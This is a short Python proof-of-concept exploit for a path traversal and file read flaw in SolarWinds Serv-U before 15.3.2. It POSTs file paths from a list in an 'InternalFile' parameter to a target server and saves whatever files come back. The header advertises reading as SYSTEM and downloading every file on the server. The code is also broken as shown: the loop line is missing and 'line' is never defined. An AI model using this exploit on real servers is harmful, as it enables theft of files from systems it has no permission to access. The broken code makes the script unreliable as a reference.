#Solarwinds Serv-U FTP LFI Downloader
#Vulnerable Software: Solarwinds Serv-U (Windows) < 15.3.2

#Discovered and created by Ken 's1ngular1ty' pyle

#PoC code for exploit - Full Read as SYSTEM and Directory Traversal. Download all files on server. Profit.
#https://documentation.solarwinds.com/en/success_center/servu/content/release_notes/serv-u_15-3-2_release_notes.htm


import requests

# User defined URL for vulnerable server
url = "http://target/"

# Read the lines from a file named lfi_list.txt
with open("lfi_list.txt", "r") as file:
    lines = file.readlines()

# Iterate through each line of the file, downloading content locally
    payload = {'Command': 'NOOP', 'InternalFile': line.strip(), 'NewWebClient': 1}
    response = requests.post(url, data=payload)

    # POC - locally save the files for download
    with open(line.strip(), "w") as output_file:
        output_file.write(response.text)
